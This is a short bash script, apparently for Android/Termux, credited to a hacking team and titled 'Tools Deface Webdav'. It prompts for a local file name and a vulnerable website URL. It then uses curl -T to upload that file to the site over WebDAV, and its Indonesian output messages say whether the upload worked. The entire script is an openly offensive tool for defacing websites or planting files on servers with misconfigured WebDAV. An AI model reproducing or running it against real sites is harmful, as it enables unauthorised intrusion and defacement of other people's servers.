#!/system/xbin/bash
clear
sleep 1
echo "Author : ./Fx-MR.CL4¥0" 
sleep 1
echo "Team : Fox Cyber Team" 
sleep 1
echo "Tools : Tools Deface Webdav"
sleep 2
echo " "
figlet F-Webdav
sleep 1
read -p "Nama Script :" script
echo " "
sleep 1
read -p "web vuln :" web
sleep 2
curl -T /storage/emulated/0/$script $web
sleep 2
echo "Jika Blank Berarti Sukses"
sleep 1
echo "Jika Muncul Eror Gagal"

